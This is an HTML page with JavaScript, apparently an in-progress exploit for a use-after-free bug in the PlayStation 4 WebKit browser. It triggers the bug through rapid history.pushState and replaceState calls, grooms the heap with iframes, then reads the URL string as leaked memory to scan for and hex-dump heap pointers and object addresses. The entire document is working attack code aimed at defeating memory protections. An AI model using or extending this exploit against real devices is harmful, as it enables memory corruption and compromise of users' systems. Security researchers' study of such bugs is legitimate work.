<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit UAF - Advanced Pointer Leak</title>

</head>
<body>
<h2>ðŸŽ¯ PS4 WebKit UAF - Advanced Pointer Leak</h2>

<button onclick="runStructureLeak()">LEAK 4 - Structure Boundary Scan</button>
<button onclick="runAdjacentLeak()">LEAK 5 - Adjacent Memory Leak</button>
<button onclick="runHistoryStateLeak()">LEAK 6 - History State Object Leak</button>
<button onclick="runFullMemoryDump()">LEAK 7 - Full Memory Dump (hex)</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");

function log(m, cls=""){ 
  const span = document.createElement("span");
  if(cls) span.className = cls;
  span.textContent = m + "\n";
  logEl.appendChild(span);
}
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

// Helper: Read u32 from URL at offset
function readU32(url, offset) {
    if(offset + 3 >= url.length) return null;
    return url.charCodeAt(offset) |
           (url.charCodeAt(offset+1) << 8) |
           (url.charCodeAt(offset+2) << 16) |
           (url.charCodeAt(offset+3) << 24);
}

// Helper: Check if looks like valid pointer
function isValidPointer(addr) {
    // PS4 userspace: 0x00000000 - 0x7FFFFFFF
    // Heap typically: 0x00100000 - 0x40000000
    return addr >= 0x00100000 && addr <= 0x7FFFFFFF;
}

// Core UAF trigger
async function triggerUAF() {
    let size = 977;
    const STEP = 14461;
    
    for(let i=0; i<48; i++){
        let char = String.fromCharCode(0x41 + (i % 26));
        let frag = char.repeat(size);
        
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
        
        size += STEP;
        await sleep(5);
    }
    
    await sleep(120);
    
    // Heap grooming
    let frames = [];
    for(let i=0; i<80; i++){
        let f = document.createElement("iframe");
        document.body.appendChild(f);
        try {
            let d = f.contentDocument;
            d.open();
            d.write("<html><body>" + ("X".repeat(2048)) + "</body></html>");
            d.close();
        } catch(e){}
        frames.push(f);
    }
    frames.forEach(f=>f.remove());
    
    await sleep(80);
}

// -------------------------------------------------
// LEAK 4 - Structure Boundary Scan
// -------------------------------------------------
async function runStructureLeak(){
    logEl.textContent = "";
    log("=== LEAK 4: Structure Boundary Scan ===", "critical");
    log("Goal: Find where string buffer ends, structure begins\n");
    
    await triggerUAF();
    
    let url = document.URL;
    log(`URL Length: ${url.length}\n`);
    
    // The leaked memory is the URL fragment buffer
    // After the fragment, there might be:
    // - String metadata
    // - Adjacent HistoryItem fields
    // - Other heap data
    
    log("[BOUNDARY SCAN] Looking for non-'V' bytes (structure data)");
    
    let lastV = -1;
    for(let i=0; i<url.length; i++){
        if(url.charCodeAt(i) !== 0x56) { // Not 'V'
            if(lastV === -1) {
                lastV = i;
                log(`  First non-V at offset ${i}: 0x${url.charCodeAt(i).toString(16)}`, "warn");
            }
        }
    }
    
    if(lastV > 0) {
        log(`\n[ANALYSIS] 'V' pattern ends at offset ${lastV}`);
        log(`  Expected fragment size (ITER 21): ${977 + 14461*21} = 304658`);
        log(`  Actual 'V' region: ${lastV} bytes`);
        
        // Scan beyond V region
        log(`\n[POST-V DATA] Scanning 1KB after V region:`);
        for(let i=lastV; i<Math.min(lastV+1024, url.length); i+=4){
            let val = readU32(url, i);
            if(val && isValidPointer(val)){
                log(`  Offset ${i}: 0x${val.toString(16).padStart(8,'0')} â† POSSIBLE POINTER`, "pointer");
            } else if(val && val !== 0x56565656) {
                log(`  Offset ${i}: 0x${val.toString(16).padStart(8,'0')}`);
            }
        }
    }
    
    log("\n=== LEAK 4 END ===");
}

// -------------------------------------------------
// LEAK 5 - Adjacent Memory Leak
// -------------------------------------------------
async function runAdjacentLeak(){
    logEl.textContent = "";
    log("=== LEAK 5: Adjacent Memory Leak ===", "critical");
    log("Goal: Read memory AFTER the URL string buffer\n");
    
    await triggerUAF();
    
    let url = document.URL;
    
    // The URL is 340356 bytes
    // But we only wrote ~304658 bytes of 'V'
    // The extra ~35KB might be:
    // - Uninitialized memory
    // - Adjacent allocations
    // - Structure padding
    
    log(`[ANALYSIS] URL length: ${url.length}`);
    log(`Expected V data: ~304658 bytes`);
    log(`Extra data: ~${url.length - 304658} bytes\n`);
    
    log("[SCANNING] Last 10KB for interesting data:");
    
    const scanStart = Math.max(0, url.length - 10240);
    let foundNonV = 0;
    let pointerCandidates = [];
    
    for(let i=scanStart; i<url.length-4; i+=4){
        let val = readU32(url, i);
        
        if(val !== 0x56565656 && val !== 0) {
            foundNonV++;
            
            if(isValidPointer(val)){
                pointerCandidates.push({offset: i, addr: val});
            }
        }
    }
    
    log(`  Non-V dwords found: ${foundNonV}`);
    log(`  Valid pointer candidates: ${pointerCandidates.length}\n`);
    
    if(pointerCandidates.length > 0){
        log("[POINTER CANDIDATES]", "critical");
        pointerCandidates.slice(0, 10).forEach(p => {
            log(`  Offset ${p.offset}: 0x${p.addr.toString(16).padStart(8,'0')}`, "pointer");
        });
        
        log(`\nâœ… POSSIBLE ADDRESS LEAK!`, "success");
    } else {
        log(`No obvious pointers in tail region`, "warn");
    }
    
    log("\n=== LEAK 5 END ===");
}

// -------------------------------------------------
// LEAK 6 - History State Object Leak
// -------------------------------------------------
async function runHistoryStateLeak(){
    logEl.textContent = "";
    log("=== LEAK 6: History State Object Leak ===", "critical");
    log("Strategy: Put objects in history.state, leak their addresses\n");
    
    // Modified UAF with state objects
    let size = 977;
    const STEP = 14461;
    
    log("[SETUP] Creating UAF with state objects...");
    
    let leakTargets = [];
    
    for(let i=0; i<48; i++){
        let char = String.fromCharCode(0x41 + (i % 26));
        let frag = char.repeat(size);
        
        // Create state object with leak target
        let stateObj = {
            iter: i,
            leak: new ArrayBuffer(64) // Potential leak target
        };
        leakTargets.push(stateObj.leak);
        
        history.pushState(stateObj, "", "#" + frag);
        history.replaceState(stateObj, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
        
        size += STEP;
        await sleep(5);
    }
    
    await sleep(120);
    
    log("[GROOMING] Heap grooming...");
    let frames = [];
    for(let i=0; i<80; i++){
        let f = document.createElement("iframe");
        document.body.appendChild(f);
        try {
            let d = f.contentDocument;
            d.open();
            d.write("<html><body>X</body></html>");
            d.close();
        } catch(e){}
        frames.push(f);
    }
    frames.forEach(f=>f.remove());
    await sleep(80);
    
    log("\n[LEAK] Reading URL...");
    let url = document.URL;
    
    log(`URL Length: ${url.length}\n`);
    
    // Scan for ArrayBuffer signature
    log("[SCAN] Looking for ArrayBuffer signatures...");
    let found = 0;
    
    for(let i=0; i<Math.min(url.length-8, 100000); i+=4){
        let v1 = readU32(url, i);
        let v2 = readU32(url, i+4);
        
        // ArrayBuffer might have specific vtable or length fields
        if(v1 && v2 && isValidPointer(v1) && v2 < 0x10000){
            log(`  Offset ${i}: ptr=0x${v1.toString(16)}, len=${v2}`, "pointer");
            found++;
            if(found >= 5) break;
        }
    }
    
    if(found > 0){
        log(`\nâœ… Found ${found} potential object pointers!`, "success");
    } else {
        log(`\nNo object pointers found`, "warn");
    }
    
    log("\n=== LEAK 6 END ===");
}

// -------------------------------------------------
// LEAK 7 - Full Memory Dump
// -------------------------------------------------
async function runFullMemoryDump(){
    logEl.textContent = "";
    log("=== LEAK 7: Full Memory Dump (Hex) ===", "critical");
    log("Dumping first 2KB and last 2KB of leaked memory\n");
    
    await triggerUAF();
    
    let url = document.URL;
    log(`Total length: ${url.length} bytes\n`);
    
    // Dump first 2KB
    log("[FIRST 2KB]");
    for(let i=0; i<2048; i+=16){
        let hex = "";
        let ascii = "";
        
        for(let j=0; j<16 && i+j<url.length; j++){
            let code = url.charCodeAt(i+j);
            hex += code.toString(16).padStart(2,'0') + " ";
            ascii += (code >= 0x20 && code <= 0x7e) ? url.charAt(i+j) : ".";
        }
        
        log(`${i.toString(16).padStart(6,'0')}: ${hex.padEnd(48)} ${ascii}`);
    }
    
    // Dump last 2KB
    log(`\n[LAST 2KB]`);
    const tailStart = Math.max(0, url.length - 2048);
    for(let i=tailStart; i<url.length; i+=16){
        let hex = "";
        let ascii = "";
        
        for(let j=0; j<16 && i+j<url.length; j++){
            let code = url.charCodeAt(i+j);
            hex += code.toString(16).padStart(2,'0') + " ";
            ascii += (code >= 0x20 && code <= 0x7e) ? url.charAt(i+j) : ".";
        }
        
        log(`${i.toString(16).padStart(6,'0')}: ${hex.padEnd(48)} ${ascii}`);
    }
    
    log("\n=== LEAK 7 END ===");
}

log("PS4 WebKit UAF - Advanced Pointer Leak");
log("Status: Info leak confirmed, searching for pointers\n");
log("Tests:");
log("4. Structure Boundary - find end of string, start of metadata");
log("5. Adjacent Memory - scan tail for pointers");
log("6. History State - leak object addresses via state");
log("7. Full Dump - hexdump of leaked memory");
</script>
</body>
</html>
